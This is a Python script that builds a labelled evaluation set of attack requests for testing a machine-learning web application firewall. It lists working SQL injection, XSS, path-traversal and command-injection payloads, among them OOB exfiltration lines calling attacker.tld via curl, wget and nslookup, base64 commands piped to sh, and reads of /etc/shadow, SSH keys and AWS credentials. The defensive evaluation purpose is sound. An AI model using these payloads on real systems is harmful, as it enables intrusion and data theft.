"""
Build external_bypass_set.csv for evaluating iWAF BiLSTM-Attention cold.

Schema matches train.csv: method, path, query_string, body, label, source, notes

EXCLUDED PATTERNS (already used in the red-team real-world test set, excluded to avoid leakage):
  - UTF-7 multipart XSS (+ADw-, +AD4-, charset=utf-7)
  - HTML entity tab/newline XSS in javascript: scheme (jav&#x09;ascript)
  - Inline-comment SQLi in JSON body (/*comment*/ between tokens)

INCLUDED FAMILIES (diverse obfuscation surfaces):
  SQLi:   classic boolean, UNION-based, time-based, hex-encoded,
          double-encoded, char-concat, case manipulation, parentheses, OOB
  XSS:    SVG vectors, event handlers, polyglot variants (no jav&#xNN;asc),
          data: URIs, attribute injection, mutation XSS, template literal
  LFI:    relative traversal, double-encoded traversal, php://filter,
          null-byte legacy, Windows paths, log poisoning paths
  CMDi:   pipe/semicolon chains, ${IFS}, $@ trick, backticks, $(),
          base64 wrappers, wildcard expansion
  PROBE:  scanner UAs, common admin paths, fingerprint endpoints

Sources: PayloadsAllTheThings (PATT), HackTricks (HT), public LFI lists,
         OS-command-injection writeups, scanner fingerprints.
"""

import csv

PAYLOADS = []

# ============================================================================
# SQLi — auth bypass, UNION, time-based, encoding tricks
# (avoid /*...*/ inline comments in JSON bodies — that is a red-teamed family)
# ============================================================================
SQLI = [
    # Classic boolean auth bypass (PATT Auth_Bypass.txt)
    ("GET",  "/login",       "username=admin'--&password=x",                     "", "PATT/Auth_Bypass", "tautology + line comment"),
    ("GET",  "/login",       "username=admin'#&password=x",                      "", "PATT/Auth_Bypass", "tautology + hash comment"),
    ("GET",  "/login",       "username=admin'+OR+'1'='1&password=x",             "", "PATT/Auth_Bypass", "classic OR tautology"),
    ("GET",  "/login",       "username=admin')+OR+('1'='1&password=x",           "", "PATT/Auth_Bypass", "parenthesised tautology"),
    ("GET",  "/login",       "username=admin'+or+1=1+limit+1--+-&password=x",    "", "PATT/Auth_Bypass", "limit + line comment"),
    ("GET",  "/login",       "username=' or 'x'='x&password=x",                  "", "PATT/Auth_Bypass", "string equality tautology"),
    ("GET",  "/login",       "username=\" or \"\"=\"&password=x",                "", "PATT/Auth_Bypass", "double-quote tautology"),
    ("GET",  "/login",       "username=admin' or 1=1#&password=x",               "", "PATT/Auth_Bypass", "or 1=1 hash comment"),
    ("GET",  "/login",       "username=' OR '' = '&password=x",                  "", "PATT/Auth_Bypass", "empty string equality"),
    ("GET",  "/login",       "username=1' or 1.e(1) or '1'='1&password=x",       "", "PATT/Auth_Bypass", "scientific notation evasion"),

    # UNION-based extraction (HackTricks SQLi)
    ("GET",  "/items",       "id=1 UNION SELECT NULL,NULL,NULL--",                "", "PATT/SQLi", "basic UNION 3 cols"),
    ("GET",  "/items",       "id=1 UNION SELECT 1,user(),version()--",            "", "PATT/SQLi", "UNION fingerprinting"),
    ("GET",  "/items",       "id=1 UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--", "", "PATT/SQLi", "UNION schema enum"),
    ("GET",  "/products",    "category=Gifts')+UNION+SELECT+username,password+FROM+users--+-", "", "PATT/SQLi", "union creds extraction"),
    ("GET",  "/items",       "id=-1+UNION+SELECT+1,2,3,4,5--+-",                  "", "PATT/SQLi", "negative id UNION"),
    ("GET",  "/items",       "id=1)+UNION+SELECT+null,concat(0x3a,user(),0x3a)--+-", "", "PATT/SQLi", "concat hex separator"),

    # Time-based blind
    ("GET",  "/items",       "id=1 AND SLEEP(5)--",                              "", "PATT/SQLi", "MySQL SLEEP"),
    ("GET",  "/items",       "id=1; WAITFOR DELAY '0:0:5'--",                    "", "PATT/SQLi", "MSSQL WAITFOR DELAY"),
    ("GET",  "/items",       "id=1 AND BENCHMARK(10000000,MD5('a'))--",          "", "PATT/SQLi", "BENCHMARK time-based"),
    ("GET",  "/items",       "id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",   "", "PATT/SQLi", "subquery sleep"),
    ("GET",  "/items",       "id=1 AND pg_sleep(5)--",                           "", "PATT/SQLi", "PostgreSQL pg_sleep"),

    # Whitespace-bypass (no /*...*/ in body — different from the red-teamed family)
    ("GET",  "/items",       "id=1%09AND%091=1",                                 "", "PATT/SQLi", "tab whitespace bypass"),
    ("GET",  "/items",       "id=1%0AAND%0A1=1",                                 "", "PATT/SQLi", "newline whitespace"),
    ("GET",  "/items",       "id=1%0DAND%0D1=1",                                 "", "PATT/SQLi", "CR whitespace"),
    ("GET",  "/items",       "id=1+%26%26+1=1",                                  "", "PATT/SQLi", "logical && bypass"),

    # Hex / encoded
    ("GET",  "/items",       "id=1+UNION+SELECT+0x61646d696e,0x70617373,0x33--", "", "PATT/SQLi", "hex literals"),
    ("GET",  "/items",       "id=1+OR+username=CHAR(97,100,109,105,110)--",       "", "PATT/SQLi", "CHAR concat"),
    ("GET",  "/items",       "id=%31%27%20OR%20%271%27%3D%271",                  "", "PATT/SQLi", "fully URL-encoded"),
    ("GET",  "/items",       "id=%2531%2527%2520OR%25201%253D1",                 "", "PATT/SQLi", "double URL-encoded"),

    # Stacked / OOB / error-based
    ("GET",  "/items",       "id=1; DROP TABLE users--",                         "", "PATT/SQLi", "stacked DROP"),
    ("GET",  "/items",       "id=1' AND extractvalue(0x0a,concat(0x0a,user()))--", "", "PATT/SQLi", "error-based extractvalue"),
    ("GET",  "/items",       "id=1' AND updatexml(null,concat(0x0a,user()),null)--", "", "PATT/SQLi", "updatexml error"),
    ("GET",  "/items",       "id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.tld\\\\a')))--", "", "PATT/SQLi", "OOB DNS via UNC"),

    # NoSQL injection (PATT NoSQL/README)
    ("POST", "/api/login",   "",  '{"username":{"$ne":null},"password":{"$ne":null}}', "PATT/NoSQL", "MongoDB $ne tautology"),
    ("POST", "/api/login",   "",  '{"username":{"$gt":""},"password":{"$gt":""}}',     "PATT/NoSQL", "MongoDB $gt empty"),
    ("POST", "/api/login",   "",  '{"username":{"$regex":".*"},"password":{"$ne":1}}', "PATT/NoSQL", "MongoDB regex wildcard"),
    ("GET",  "/login",       "user[$ne]=admin&pass[$ne]=admin",                  "",  "PATT/NoSQL", "form-encoded $ne"),

    # Form-encoded body SQLi (NOT JSON - the red-teamed family used JSON)
    ("POST", "/login",       "", "username=admin&password=' OR '1'='1",          "PATT/SQLi", "form body OR tautology"),
    ("POST", "/account/recover", "", "email=admin@x.com'--",                     "PATT/SQLi", "form body single-quote comment"),
    ("POST", "/search",      "", "q=cat' UNION SELECT NULL,NULL,version()--",    "PATT/SQLi", "form body UNION"),

    # Header-based SQLi (under-tested surface)
    ("GET",  "/api/v1/user", "id=1",                                              "", "HackTricks/SQLi-headers", "header injection (X-Forwarded-For: 1' OR 1=1--)"),

    # MSSQL / Oracle / PostgreSQL specific
    ("GET",  "/items",       "id=convert(int,(select%20@@version))",              "", "PATT/MSSQL", "MSSQL convert error"),
    ("GET",  "/items",       "id=1+UNION+SELECT+banner+FROM+v$version--",         "", "PATT/Oracle", "Oracle v$version"),
    ("GET",  "/items",       "id=1;COPY+(SELECT+'')+TO+PROGRAM+'id'--",           "", "PATT/PostgreSQL", "PG COPY TO PROGRAM RCE"),
]

for m, p, q, b, src, notes in SQLI:
    PAYLOADS.append({"method": m, "path": p, "query_string": q, "body": b,
                     "label": "sqli", "source": src, "notes": notes})


# ============================================================================
# XSS — AVOIDING jav&#x09;asc (red-teamed) AND UTF-7 multipart (red-teamed)
# Focus on: SVG, event handlers, polyglots, attribute injection, mutations
# ============================================================================
XSS = [
    # SVG-based
    ("GET",  "/search", "q=<svg/onload=alert(1)>",                              "", "PATT/XSS", "SVG onload"),
    ("GET",  "/search", "q=<svg onload=alert(1)>",                              "", "PATT/XSS", "SVG onload spaced"),
    ("GET",  "/search", "q=<svg/onload=alert(/xss/)>",                          "", "PATT/XSS", "SVG with regex literal"),
    ("GET",  "/search", "q=<svg><script>alert(1)</script></svg>",               "", "PATT/XSS", "SVG nested script"),
    ("GET",  "/search", "q=<svg id=x onload=alert(id)>",                        "", "PATT/XSS", "SVG attr exfil"),
    ("GET",  "/search", "q=<svg><animate onbegin=alert(1) attributeName=x>",    "", "PATT/XSS", "SVG animate onbegin"),
    ("GET",  "/search", "q=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>", "", "PATT/XSS", "SVG animate href"),

    # Image / video event handlers
    ("GET",  "/profile", "bio=<img src=x onerror=alert(1)>",                    "", "PATT/XSS", "img onerror classic"),
    ("GET",  "/profile", "bio=<img src=x:alert(alt) onerror=eval(src) alt=xss>", "", "PATT/XSS", "img eval src trick"),
    ("GET",  "/profile", "bio=<img src=1 onerror=\"alert(1)\">",                "", "PATT/XSS", "img onerror dq"),
    ("GET",  "/profile", "bio=<video><source onerror=alert(1)>",                "", "PATT/XSS", "video source onerror"),
    ("GET",  "/profile", "bio=<audio src=x onerror=alert(1)>",                  "", "PATT/XSS", "audio onerror"),
    ("GET",  "/profile", "bio=<iframe src=javascript:alert(1)>",                "", "PATT/XSS", "iframe javascript URI"),
    ("GET",  "/profile", "bio=<object data=javascript:alert(1)>",               "", "PATT/XSS", "object data URI"),
    ("GET",  "/profile", "bio=<embed src=javascript:alert(1)>",                 "", "PATT/XSS", "embed src javascript"),

    # Body / details / autofocus
    ("GET",  "/page", "name=<body onload=alert(1)>",                            "", "PATT/XSS", "body onload"),
    ("GET",  "/page", "name=<details ontoggle=alert(1) open>",                  "", "PATT/XSS", "details ontoggle"),
    ("GET",  "/page", "name=<input autofocus onfocus=alert(1)>",                "", "PATT/XSS", "input autofocus"),
    ("GET",  "/page", "name=<select autofocus onfocus=alert(1)>",               "", "PATT/XSS", "select autofocus"),
    ("GET",  "/page", "name=<textarea autofocus onfocus=alert(1)>",             "", "PATT/XSS", "textarea autofocus"),
    ("GET",  "/page", "name=<keygen autofocus onfocus=alert(1)>",               "", "PATT/XSS", "keygen autofocus"),
    ("GET",  "/page", "name=<marquee onstart=alert(1)>",                        "", "PATT/XSS", "marquee onstart"),

    # Attribute / handler injection in existing tags
    ("GET",  "/profile", "name=\" autofocus onfocus=alert(1) x=\"",             "", "PATT/XSS", "attr break + autofocus"),
    ("GET",  "/profile", "name=\" onmouseover=alert(1) x=\"",                   "", "PATT/XSS", "attr break + mouseover"),
    ("GET",  "/profile", "name=' onclick=alert(1)//",                           "", "PATT/XSS", "attr break + onclick + comment"),
    ("GET",  "/profile", "name='-alert(1)-'",                                   "", "PATT/XSS", "JS string break"),
    ("GET",  "/profile", "name=</script><script>alert(1)</script>",             "", "PATT/XSS", "script context break"),

    # Polyglots (avoiding jav&#x09;asc family — different obfuscation surface)
    ("GET",  "/search", "q=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "", "PATT/XSS-polyglot", "Sobky polyglot v1"),
    ("GET",  "/search", "q=\"><svg onload=alert(1)>",                            "", "PATT/XSS", "attr break + svg"),
    ("GET",  "/search", "q='\"><script>alert(1)</script>",                       "", "PATT/XSS", "double break + script"),
    ("GET",  "/search", "q=`${alert(1)}`",                                       "", "PATT/XSS", "template literal injection"),

    # Encoded (NOT entity-tab — different angle)
    ("GET",  "/search", "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",             "", "PATT/XSS", "URL-encoded script"),
    ("GET",  "/search", "q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E", "", "PATT/XSS", "double URL-encoded"),
    ("GET",  "/search", "q=%uff1cscript%uff1ealert(1)%uff1c/script%uff1e",       "", "PATT/XSS", "fullwidth unicode brackets"),
    ("GET",  "/search", "q=<scr<script>ipt>alert(1)</scr<script>ipt>",           "", "PATT/XSS", "double-tag filter bypass"),
    ("GET",  "/search", "q=<script>alert`1`</script>",                           "", "PATT/XSS", "template literal alert"),
    ("GET",  "/search", "q=<script>eval(atob('YWxlcnQoMSk='))</script>",         "", "PATT/XSS", "atob base64 eval"),

    # Mutation / DOM clobbering
    ("GET",  "/profile", "html=<a id=defaultView><img src=x onerror=alert(1)>",  "", "HackTricks/XSS", "DOM clobber defaultView"),
    ("GET",  "/profile", "html=<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(1)>\">", "", "HackTricks/XSS", "mutation MathML"),

    # JSON body XSS (not inline-comment style — this is straight XSS)
    ("POST", "/api/comments", "", '{"text":"<script>alert(1)</script>","author":"x"}', "PATT/XSS", "JSON body straight script"),
    ("POST", "/api/comments", "", '{"text":"<svg/onload=alert(1)>","author":"x"}',     "PATT/XSS", "JSON body SVG"),
    ("POST", "/api/products", "", '{"name":"\\\"><img src=x onerror=alert(1)>"}',       "PATT/XSS", "JSON body attr break"),
]

for m, p, q, b, src, notes in XSS:
    PAYLOADS.append({"method": m, "path": p, "query_string": q, "body": b,
                     "label": "xss", "source": src, "notes": notes})


# ============================================================================
# LFI — path traversal, php://, encoding, Windows, log poisoning paths
# ============================================================================
LFI = [
    ("GET", "/page",     "file=../../../etc/passwd",                              "", "PATT/LFI", "basic traversal"),
    ("GET", "/page",     "file=../../../../etc/passwd",                           "", "PATT/LFI", "deeper traversal"),
    ("GET", "/page",     "file=../../../../../../etc/passwd",                     "", "PATT/LFI", "extra-deep traversal"),
    ("GET", "/page",     "file=....//....//etc/passwd",                           "", "PATT/LFI", "double-dot/slash bypass"),
    ("GET", "/page",     "file=..///////..////..//////etc/passwd",                "", "PATT/LFI", "extra slashes"),
    ("GET", "/page",     "file=/\\../\\../\\../etc/passwd",                       "", "PATT/LFI", "mixed slashes"),
    ("GET", "/page",     "file=..%2f..%2f..%2fetc%2fpasswd",                      "", "PATT/LFI", "URL-encoded traversal"),
    ("GET", "/page",     "file=..%252f..%252f..%252fetc%252fpasswd",              "", "PATT/LFI", "double URL-encoded"),
    ("GET", "/page",     "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",          "", "PATT/LFI", "fully encoded dots"),
    ("GET", "/page",     "file=..%c0%af..%c0%afetc%c0%afpasswd",                  "", "PATT/LFI", "UTF-8 overlong slash"),
    ("GET", "/page",     "file=..%u2215..%u2215etc%u2215passwd",                  "", "PATT/LFI", "unicode division slash"),
    ("GET", "/page",     "file=../../../etc/passwd%00.png",                       "", "PATT/LFI", "null-byte legacy"),
    ("GET", "/page",     "file=../../../etc/passwd%00",                           "", "PATT/LFI", "null-byte trailing"),
    ("GET", "/page",     "file=../../../etc/passwd%2300",                         "", "PATT/LFI", "encoded hash trick"),

    # PHP wrappers
    ("GET", "/page",     "file=php://filter/convert.base64-encode/resource=index.php", "", "PATT/LFI", "php filter base64"),
    ("GET", "/page",     "file=php://filter/read=string.rot13/resource=index.php",     "", "PATT/LFI", "php filter rot13"),
    ("GET", "/page",     "file=pHp://FilTer/convert.base64-encode/resource=/etc/passwd", "", "PATT/LFI", "case-mixed wrapper"),
    ("GET", "/page",     "file=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd", "", "PATT/LFI", "compression chain"),
    ("GET", "/page",     "file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",   "", "PATT/LFI", "data URI RCE"),
    ("GET", "/page",     "file=expect://id",                                            "", "PATT/LFI", "expect wrapper"),
    ("GET", "/page",     "file=zip://shell.jpg%23payload.php",                          "", "PATT/LFI", "zip wrapper"),
    ("GET", "/page",     "file=phar:///tmp/upload.phar/payload",                        "", "PATT/LFI", "phar wrapper"),

    # Windows
    ("GET", "/download", "file=..\\..\\..\\windows\\win.ini",                     "", "PATT/LFI", "Windows backslash"),
    ("GET", "/download", "file=..%5c..%5c..%5cwindows%5cwin.ini",                 "", "PATT/LFI", "Windows enc backslash"),
    ("GET", "/download", "file=C:\\boot.ini",                                     "", "PATT/LFI", "absolute Windows"),
    ("GET", "/download", "file=C:%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts",  "", "PATT/LFI", "Windows hosts file"),

    # Log poisoning paths (still LFI category)
    ("GET", "/page",     "file=/var/log/apache2/access.log",                      "", "PATT/LFI", "Apache log"),
    ("GET", "/page",     "file=/proc/self/environ",                                "", "PATT/LFI", "proc environ"),
    ("GET", "/page",     "file=/proc/self/fd/0",                                   "", "PATT/LFI", "proc fd"),
    ("GET", "/page",     "file=/var/log/auth.log",                                 "", "PATT/LFI", "auth log"),
    ("GET", "/page",     "file=../../../var/lib/php5/sess_abcd1234",               "", "PATT/LFI", "PHP session file"),

    # Common config files
    ("GET", "/include",  "page=../../../etc/shadow",                              "", "emadshanab/LFI-list", "/etc/shadow"),
    ("GET", "/include",  "page=../../../etc/group",                               "", "emadshanab/LFI-list", "/etc/group"),
    ("GET", "/include",  "page=../../../home/user/.ssh/id_rsa",                   "", "PATT/LFI", "SSH private key"),
    ("GET", "/include",  "page=../../../root/.bash_history",                      "", "emadshanab/LFI-list", "bash history"),
    ("GET", "/include",  "page=../../../var/www/html/wp-config.php",              "", "emadshanab/LFI-list", "wp-config"),
    ("GET", "/include",  "page=../../../etc/apache2/apache2.conf",                "", "emadshanab/LFI-list", "Apache config"),

    # Path-only (no file= param — whole path is malicious)
    ("GET", "/files/../../../etc/passwd", "",                                     "", "PATT/LFI", "in-path traversal"),
    ("GET", "/static/../../etc/passwd",   "",                                     "", "PATT/LFI", "in-path shallow"),
]

for m, p, q, b, src, notes in LFI:
    PAYLOADS.append({"method": m, "path": p, "query_string": q, "body": b,
                     "label": "lfi", "source": src, "notes": notes})


# ============================================================================
# CMDi — pipe/semicolon, ${IFS}, $@, backticks, $(), wildcards
# ============================================================================
CMDI = [
    # Basic command chaining
    ("GET", "/ping", "host=127.0.0.1;ls -la",                                    "", "PATT/CmdInjection", "semicolon chain"),
    ("GET", "/ping", "host=127.0.0.1;cat /etc/passwd",                           "", "PATT/CmdInjection", "semicolon cat passwd"),
    ("GET", "/ping", "host=127.0.0.1|cat /etc/passwd",                           "", "PATT/CmdInjection", "pipe chain"),
    ("GET", "/ping", "host=127.0.0.1||cat /etc/passwd",                          "", "PATT/CmdInjection", "double pipe"),
    ("GET", "/ping", "host=127.0.0.1&&cat /etc/passwd",                          "", "PATT/CmdInjection", "double ampersand"),
    ("GET", "/ping", "host=127.0.0.1`cat /etc/passwd`",                          "", "PATT/CmdInjection", "backtick exec"),
    ("GET", "/ping", "host=127.0.0.1$(cat /etc/passwd)",                         "", "PATT/CmdInjection", "subshell exec"),
    ("GET", "/ping", "host=127.0.0.1%0Acat /etc/passwd",                         "", "PATT/CmdInjection", "newline injection"),
    ("GET", "/ping", "host=127.0.0.1%0Dcat /etc/passwd",                         "", "PATT/CmdInjection", "CR injection"),

    # ${IFS} space bypass
    ("GET", "/run", "cmd=cat${IFS}/etc/passwd",                                  "", "PATT/CmdInjection", "IFS space bypass"),
    ("GET", "/run", "cmd=cat$IFS$9/etc/passwd",                                  "", "PATT/CmdInjection", "IFS positional"),
    ("GET", "/run", "cmd={cat,/etc/passwd}",                                     "", "PATT/CmdInjection", "brace expansion"),
    ("GET", "/run", "cmd=X=$'cat\\x20/etc/passwd';$X",                           "", "PATT/CmdInjection", "shell escape var"),
    ("GET", "/run", "cmd=cat<>/etc/passwd",                                      "", "PATT/CmdInjection", "redirection trick"),

    # Quote / escape obfuscation
    ("GET", "/run", "cmd=c'a't /et'c'/pa'sswd",                                  "", "PATT/CmdInjection", "embedded single-quote"),
    ("GET", "/run", "cmd=c\"a\"t /et\"c\"/pa\"sswd",                             "", "PATT/CmdInjection", "embedded double-quote"),
    ("GET", "/run", "cmd=c\\at /et\\c/pa\\sswd",                                 "", "PATT/CmdInjection", "embedded backslash"),
    ("GET", "/run", "cmd=$0<<<id",                                                "", "PATT/CmdInjection", "$0 herestring"),

    # Base64 / encoded payloads
    ("GET", "/run", "cmd=echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh",      "", "HackTricks/CMDi", "base64 wrapper"),
    ("GET", "/run", "cmd=`echo${IFS}Y2F0${IFS}/etc/passwd|base64${IFS}-d`",      "", "HackTricks/CMDi", "backtick base64"),

    # Time-based blind
    ("GET", "/run", "cmd=ping -c 5 127.0.0.1",                                   "", "PATT/CmdInjection", "ping time-based"),
    ("GET", "/run", "cmd=sleep 5",                                               "", "PATT/CmdInjection", "sleep time-based"),

    # OOB
    ("GET", "/run", "cmd=curl http://attacker.tld/$(whoami)",                    "", "PATT/CmdInjection", "OOB whoami exfil"),
    ("GET", "/run", "cmd=nslookup `whoami`.attacker.tld",                        "", "PATT/CmdInjection", "OOB DNS exfil"),
    ("GET", "/run", "cmd=wget http://attacker.tld/$(id|base64)",                 "", "PATT/CmdInjection", "OOB id base64"),

    # Windows command injection
    ("GET", "/run", "cmd=&type C:\\Windows\\win.ini",                            "", "PATT/CmdInjection", "Windows type"),
    ("GET", "/run", "cmd=&dir C:\\",                                             "", "PATT/CmdInjection", "Windows dir"),
    ("GET", "/run", "cmd=&powershell -c \"Get-Content C:\\Windows\\win.ini\"",   "", "PATT/CmdInjection", "PowerShell get-content"),
    ("GET", "/run", "cmd=ping%CommonProgramFiles:~10,-18%127.0.0.1",             "", "PATT/CmdInjection", "Windows env-var trick"),

    # JSON body cmdi
    ("POST", "/api/exec", "", '{"cmd":"127.0.0.1;cat /etc/passwd"}',             "PATT/CmdInjection", "JSON body cmdi"),
    ("POST", "/api/exec", "", '{"target":"$(whoami)"}',                          "PATT/CmdInjection", "JSON body subshell"),
    ("POST", "/api/exec", "", '{"host":"127.0.0.1`id`"}',                        "PATT/CmdInjection", "JSON body backtick"),
]

for m, p, q, b, src, notes in CMDI:
    PAYLOADS.append({"method": m, "path": p, "query_string": q, "body": b,
                     "label": "cmdi", "source": src, "notes": notes})


# ============================================================================
# PROBE — scanner fingerprints, common admin/info paths, banner-grab tools
# ============================================================================
PROBE = [
    ("GET", "/.env",           "",                  "", "common-scanner-list", "env file"),
    ("GET", "/.git/config",    "",                  "", "common-scanner-list", "git config"),
    ("GET", "/.git/HEAD",      "",                  "", "common-scanner-list", "git HEAD"),
    ("GET", "/.aws/credentials", "",                "", "common-scanner-list", "AWS creds"),
    ("GET", "/.svn/entries",   "",                  "", "common-scanner-list", "SVN entries"),
    ("GET", "/.htaccess",      "",                  "", "common-scanner-list", "htaccess"),
    ("GET", "/.htpasswd",      "",                  "", "common-scanner-list", "htpasswd"),
    ("GET", "/.DS_Store",      "",                  "", "common-scanner-list", "macOS DS_Store"),
    ("GET", "/wp-admin/",      "",                  "", "common-scanner-list", "wp-admin"),
    ("GET", "/wp-login.php",   "",                  "", "common-scanner-list", "wp-login"),
    ("GET", "/wp-config.php.bak", "",               "", "common-scanner-list", "wp-config backup"),
    ("GET", "/admin/",         "",                  "", "common-scanner-list", "admin path"),
    ("GET", "/administrator/", "",                  "", "common-scanner-list", "Joomla admin"),
    ("GET", "/phpmyadmin/",    "",                  "", "common-scanner-list", "phpMyAdmin"),
    ("GET", "/pma/",           "",                  "", "common-scanner-list", "pma alias"),
    ("GET", "/server-status",  "",                  "", "common-scanner-list", "Apache status"),
    ("GET", "/server-info",    "",                  "", "common-scanner-list", "Apache info"),
    ("GET", "/.well-known/security.txt", "",        "", "common-scanner-list", "security.txt"),
    ("GET", "/robots.txt",     "",                  "", "common-scanner-list", "robots probe"),
    ("GET", "/sitemap.xml",    "",                  "", "common-scanner-list", "sitemap probe"),
    ("GET", "/api/",           "",                  "", "common-scanner-list", "api probe"),
    ("GET", "/api/v1/users",   "",                  "", "common-scanner-list", "users enum"),
    ("GET", "/swagger-ui/",    "",                  "", "common-scanner-list", "swagger UI"),
    ("GET", "/swagger.json",   "",                  "", "common-scanner-list", "swagger spec"),
    ("GET", "/actuator/health", "",                 "", "common-scanner-list", "Spring actuator"),
    ("GET", "/actuator/env",   "",                  "", "common-scanner-list", "Spring env"),
    ("GET", "/console/",       "",                  "", "common-scanner-list", "WebLogic console"),
    ("GET", "/jmx-console/",   "",                  "", "common-scanner-list", "JBoss jmx"),
    ("GET", "/cgi-bin/",       "",                  "", "common-scanner-list", "cgi-bin"),
    ("GET", "/manager/html",   "",                  "", "common-scanner-list", "Tomcat manager"),
    ("GET", "/.vscode/sftp.json", "",               "", "common-scanner-list", "VS Code SFTP"),
    ("GET", "/composer.json",  "",                  "", "common-scanner-list", "Composer"),
    ("GET", "/config.php.swp", "",                  "", "common-scanner-list", "vim swap"),
    ("GET", "/backup.zip",     "",                  "", "common-scanner-list", "backup zip"),
    ("GET", "/db.sql",         "",                  "", "common-scanner-list", "SQL dump"),
    ("GET", "/shell.php",      "",                  "", "common-scanner-list", "webshell guess"),
    ("GET", "/test.php",       "",                  "", "common-scanner-list", "test php"),
]

for m, p, q, b, src, notes in PROBE:
    PAYLOADS.append({"method": m, "path": p, "query_string": q, "body": b,
                     "label": "probe", "source": src, "notes": notes})


# ============================================================================
# Write CSV
# ============================================================================
import os
out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "external_bypass_set.csv")
with open(out_path, "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["method", "path", "query_string", "body", "label", "source", "notes"])
    writer.writeheader()
    for row in PAYLOADS:
        writer.writerow(row)

print(f"Wrote {out_path}")
print(f"Total payloads: {len(PAYLOADS)}")

# Class distribution
from collections import Counter
c = Counter(p["label"] for p in PAYLOADS)
print("\nPer-class counts:")
for label in ["benign", "sqli", "xss", "lfi", "cmdi", "probe"]:
    print(f"  {label:8s}: {c.get(label, 0)}")
print(f"  TOTAL   : {sum(c.values())}")

# Source distribution
print("\nPer-source counts:")
src_counter = Counter(p["source"].split("/")[0] for p in PAYLOADS)
for src, n in sorted(src_counter.items(), key=lambda x: -x[1]):
    print(f"  {src:30s}: {n}")
